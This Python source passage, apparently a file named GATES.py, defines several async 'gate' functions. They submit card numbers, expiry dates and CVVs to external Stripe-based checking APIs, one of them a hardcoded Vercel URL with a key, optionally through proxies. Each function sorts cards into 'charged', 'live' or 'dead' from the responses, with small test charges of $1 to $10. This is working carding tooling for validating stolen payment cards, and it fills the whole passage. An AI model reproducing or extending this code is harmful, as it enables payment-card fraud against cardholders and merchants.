    url = f"{SAVVY_API}/?lista={card}|{month}|{year}|{cvv}&sk={sk}&charge_type={charge_type}&currency=usd&amount=1"
    if proxy: url += f"&proxy={proxy}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=60) as resp:
                text = await resp.text()
                if "approved" in text.lower() or "success" in text.lower():
                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged 🔥", "gate": f"Stripe SK ({charge_type.upper()})"}
                if any(x in text.lower() for x in ["cvc_check: pass", "cvv live", "insufficient_funds", "requires_action"]):
                    return {"status": "live", "response": "Live (CVV/Funds) ✅", "gate": f"Stripe SK ({charge_type.upper()})"}
                return {"status": "dead", "response": "Declined", "gate": f"Stripe SK ({charge_type.upper()})"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": f"Stripe SK ({charge_type.upper()})"}

async def check_stripe_nonsk(card: str, month: str, year: str, cvv: str, proxy=None, api_version=1) -> dict:
    """Stripe Non-SK Charge Gate (Cyborx Port)"""
    api_map = {1: NONSK_API_1, 2: NONSK_API_2, 3: NONSK_API_3, 4: NONSK_API_4}
    base_url = api_map.get(api_version, NONSK_API_1)
    url = f"{base_url}/?cc={card}|{month}|{year}|{cvv}"
    if proxy: url += f"&proxy={proxy}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=60) as resp:
                text = await resp.text()
                if "Payment Successful" in text or "succeeded" in text:
                    return {"status": "charged", "amount": "$1-5", "response": "$1-5 Charged 🔥", "gate": f"Stripe NonSK (API {api_version})"}
                if any(x in text for x in ["requires_action", "insufficient_funds", "incorrect_cvc"]):
                    return {"status": "live", "response": "Live (CVV/3DS) ✅", "gate": f"Stripe NonSK (API {api_version})"}
                return {"status": "dead", "response": "Declined", "gate": f"Stripe NonSK (API {api_version})"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": f"Stripe Non-SK (V{api_version})"}

async def check_stripe_inbuilt(card: str, month: str, year: str, cvv: str, pk: str, cs: str, acct: str = "", proxy: str = None, is_ccn: bool = False) -> dict:
    """Inbuilt Stripe AutoHitter Gate (Cyborx Port)"""
    base_url = INBUILT_CCN_API if is_ccn else INBUILT_CVV_API
    url = f"{base_url}/?cc={card}|{month}|{year}|{cvv}&client_secet={cs}&pk={pk}&acct={acct}"
    if proxy: url += f"&proxy={proxy}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=60) as resp:
                text = await resp.text()
                if "Payment Successful" in text:
                    return {"status": "charged", "amount": "$1-10", "response": "$1-10 Charged 🔥", "gate": "Inbuilt Hitter"}
                if any(x in text for x in ["insufficient_funds", "incorrect_cvc", "stripe_3ds2_fingerprint"]):
                    return {"status": "live", "response": "Live (CVV/3DS) ✅", "gate": "Inbuilt Hitter"}
                return {"status": "dead", "response": "Declined", "gate": "Inbuilt Hitter"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Inbuilt Hitter"}

async def check_stripe_vercel(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Stripe Vercel API Gate (Single Check Only)"""
    url = f"https://st-charge-1.vercel.app/check?gateway=St_Charge_1$&key=AloneOp&cc={card}|{month}|{year}|{cvv}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=60) as resp:
                try:
                    res_json = await resp.json()
                except:
                    text = await resp.text()
                    return {"status": "error", "response": text[:100], "gate": "Stripe Single"}
                
                status = res_json.get("Status", "").lower() # Note: API returns Capitalized keys 'Status', 'Response'
                response = res_json.get("Response", "")
                
                if "charged" in status or "success" in status or "approved" in status:
                     return {"status": "charged", "amount": "$1.00", "response": "Charged/Auth Success 🔥", "gate": "Stripe Single"}
                
                if "insufficient" in response.lower() or "insufficient" in status:
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Stripe Single"}
                
                if "security code" in response.lower() or "cvv" in response.lower():
                     return {"status": "live", "response": "CVV Mismatch (Live) ✅", "gate": "Stripe Single"}

                return {"status": "dead", "response": response or "Declined", "gate": "Stripe Single"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Stripe Single"}


async def check_stripe_wc(c, m, y, cv, p=None): 
    return {"status": "declined", "response": "Fallback", "gate": "WC"}

print("[OK] GATES.py UPDATED | Proxy & Charge logic added")